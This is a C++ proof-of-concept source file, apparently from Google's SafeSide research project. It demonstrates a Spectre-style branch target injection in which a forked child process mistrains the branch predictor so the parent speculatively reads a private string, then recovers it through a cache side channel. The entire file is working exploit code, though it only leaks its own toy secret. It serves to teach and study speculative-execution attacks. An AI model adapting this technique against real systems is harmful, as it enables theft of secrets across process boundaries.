/*
 * Copyright 2019 Google LLC
 *
 * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
 * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
 *
 * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
 */

/**
 * This example exploits the fact that forked processes have the same code
 * addresses (and therefore also jump source and jump destination addresses).
 * We create two processes - the child that acts as an attacker and confuses the
 * branch predictor to jump on addresses that reveal private data.
 * Those jump targets are architecturally impossible on the parent process that
 * acts as the victim. While jumping architecturally always on a method that
 * accesses only public data, sometimes speculatively jumps on the incorrect
 * branch address that is injected by the child.
 **/

#include "compiler_specifics.h"

#if !SAFESIDE_LINUX
#  error Unsupported OS. Linux required.
#endif

#include <sched.h>
#include <signal.h>
#include <sys/types.h>
#include <unistd.h>

#include <array>
#include <cstring>
#include <iostream>

#include "cache_sidechannel.h"
#include "instr.h"
#include "utils.h"

const char *public_data = "xxxxxxxxxxxxxxxx";
const char *private_data = "It's a s3kr3t!!!";

// Empirically tested to have a good performance. 2048 is slower, but increasing
// the number further does not help.
constexpr size_t kAccessorArrayLength = 4096;

// Used in pointer-arithmetics and control-flow. On the child (attacker) it is
// 0, on the parent (victim) it is non-zero (it stores the pid of the child).
pid_t pid;
// Stores the parent pid. Used by the child to terminate itself.
pid_t ppid;

// DataAccessor provides an interface to access bytes from either the public or
// the private storage.
class DataAccessor {
 public:
  virtual char GetDataByte(size_t index) = 0;
  virtual ~DataAccessor(){};
};

// PrivateDataAccessor returns private_data. Used only by the child (attacker).
class PrivateDataAccessor : public DataAccessor {
 public:
  char GetDataByte(size_t index) override { return private_data[index]; }
};

// PublicDataAccessor returns public_data. Used only by the victim (parent).
class PublicDataAccessor : public DataAccessor {
 public:
  char GetDataByte(size_t index) override { return public_data[index]; }
};

static char LeakByte(size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();
  auto array_of_pointers =
      std::unique_ptr<std::array<DataAccessor *, kAccessorArrayLength>>(
          new std::array<DataAccessor *, kAccessorArrayLength>());

  // Public data accessor. Used by the victim (parent). Leaks only public data.
  auto public_data_accessor =
      std::unique_ptr<DataAccessor>(new PublicDataAccessor);

  // Private data accessor. Used by the attacker (child). Leaks private data.
  auto private_data_accessor =
      std::unique_ptr<DataAccessor>(new PrivateDataAccessor);

  for (int run = 0;; ++run) {
    // Only the parent needs to flush the oracle.
    if (pid != 0) {
      sidechannel.FlushOracle();
    }

    // Setup all pointers to use public_data_accessor on the victim and
    // private_data_accessor on the attacker.
    for (auto &pointer : *array_of_pointers) {
      // This is a branchless equivalent of:
      // pointer = pid == 0 : private_data_accessor.get()
      //                    ? public_data_accesor.get();
      // Parent (victim) uses public_data_accessor, child (attacker) uses
      // private_data_accessor.
      // We are copying the data in here, because copying them outside of the
      // loop decreases the attack efficiency.
      pointer = private_data_accessor.get() + static_cast<bool>(pid) * (
          public_data_accessor.get() - private_data_accessor.get());
    }

    for (size_t i = 0; i < kAccessorArrayLength; ++i) {
      DataAccessor *accessor = (*array_of_pointers)[i];

      // We make sure to flush whole accessor object in case it is
      // hypothetically on multiple cache-lines.
      const char *accessor_bytes = reinterpret_cast<const char *>(accessor);

      // Only the parent needs to flush the accessor.
      if (pid != 0) {
        FlushFromDataCache(accessor_bytes, accessor_bytes + sizeof(DataAccessor));
      }

      // Speculative fetch at the offset. Architecturally the victim fetches
      // always from the public_data, though speculatively it fetches the
      // private_data when it is mistrained.
      ForceRead(oracle.data() +
                static_cast<size_t>(accessor->GetDataByte(offset)));
    }

    // Only the parent (victim) computes results.
    if (pid != 0) {
      std::pair<bool, char> result =
          sidechannel.RecomputeScores(public_data[offset]);
      if (result.first) {
        return result.second;
      }

      if (run > 100000) {
        std::cerr << "Does not converge " << result.second << std::endl;
        exit(EXIT_FAILURE);
      }
    }

    // If the parent pid changed, the original parent is dead and the child
    // should terminate too.
    if (pid == 0 && getppid() != ppid) {
      exit(EXIT_SUCCESS);
    }

    // Let the other process run to increase the interference.
    sched_yield();
  }
}

void ChildProcess() {
  // Infinitely interfere with the critical branching. Results are not
  // interesting.
  LeakByte(0);
}

void ParentProcess() {
  std::cout << "Leaking the string: ";
  std::cout.flush();
  for (size_t i = 0; i < strlen(public_data); ++i) {
    std::cout << LeakByte(i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}

int main() {
  // We need both processes to run on the same core. Pinning the parent before
  // the fork to the first core. The child inherits the settings.
  PinToTheFirstCore();

  // Record the parent pid for the death check in the child. When the parent pid
  // changes for the child, it means that the child should terminate.
  ppid = getpid();

  pid = fork();
  if (pid == 0) {
    // Child is the attacker.
    ChildProcess();
  } else {
    // Parent is the victim.
    ParentProcess();
  }
}
